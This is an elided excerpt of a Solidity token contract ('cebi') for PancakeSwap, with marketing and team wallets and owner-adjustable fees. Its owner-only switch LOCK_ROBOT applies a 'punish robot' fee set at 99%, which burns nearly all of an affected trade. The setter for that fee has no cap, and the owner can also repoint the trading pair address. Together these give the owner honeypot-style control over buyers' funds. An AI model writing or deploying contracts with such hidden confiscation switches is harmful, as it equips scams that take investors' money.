...
contract cebi is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "cebi";
    string private _symbol = "cebi";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress =
        payable(0x1e7ecdB56802cEAd4953a9Ff306173c94f7047C2); // Marketing Address
    address payable public teamWalletAddress =
        payable(0xbffA41E941ec0c2d4e6B6d1976F9bb271D2e99d4); // Team Address
    ...
    uint256 public punishRobotFee=99;



    uint256 private _totalSupply = 640000 * 10**9 * 10**_decimals;
    uint256 public _maxTxAmount = _totalSupply;
    uint256 public _walletMax = _totalSupply.div(1000);
    uint256 public minimumTokensBeforeSwap =_totalSupply.div(10**6);
    bool public LOCK_ROBOT = false;
    ...
    constructor() {
        if (true) {
            // PancakeSwap V2
            address _mainnetRouterV2Address = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
            // Testnet
            address _testnetRouterAddress = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
            // localhost
            address _localhostRouterAddress = 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0;
            // PancakeSwap Testnet = https://pancake.kiemtienonline360.com/
            address _testnetPancakeRouterAddress = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    ...
    function setLockRobot(bool isAllow) public onlyOwner {
        LOCK_ROBOT = isAllow;
    }
    ...
    function setBuyBurnFee(uint256 newBuyBurnFee) external onlyOwner {
        require(newBuyBurnFee<=100);
        buyBurnFee = newBuyBurnFee;
    }
    function setSellBurnFee(uint256 newSellBurnFee) external onlyOwner {
        require(newSellBurnFee<=100);
        sellBurnFee = newSellBurnFee;
    }


    function setPancakePairAddr(address newPancakePair) external onlyOwner {
        require(newPancakePair != uniswapPair);
        require(newPancakePair != address(0x0));
        uniswapPair = newPancakePair;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isMarketPair[address(uniswapPair)] = true;
    }
    ...
    function setPunishRobotFee(uint256 newPunishFee)external onlyOwner {
        punishRobotFee=newPunishFee;
    }
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            if (LOCK_ROBOT) {
                finalAmount = takePunishFee(sender, recipient, finalAmount);
            }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
         uint256 _totalDistributionShares = liquidityShare.add(marketingShare).add(
            teamShare
        );
        ...
        uint256 amountBNBLiquidity = amountReceived
            ...
            .div(totalBNBFee)
            .div(2);
        uint256 amountBNBTeam = amountReceived.mul(teamShare).div(totalBNBFee);
    ...
    function takeFee(
        ...
        if (isMarketPair[sender]) {
            ...
            burnAmount=amount.mul(buyBurnFee).div(100);
        } else if (isMarketPair[recipient]) {
            feeAmount = amount.mul(sellFee).div(100);
            burnAmount=amount.mul(sellBurnFee).div(100);
    ...
    function takePunishFee(
        ...
        if (isMarketPair[sender]) {
            burnAmount = amount.mul(punishRobotFee).div(100);
        } else if (isMarketPair[recipient]) {
            burnAmount = amount.mul(punishRobotFee).div(100);
        }
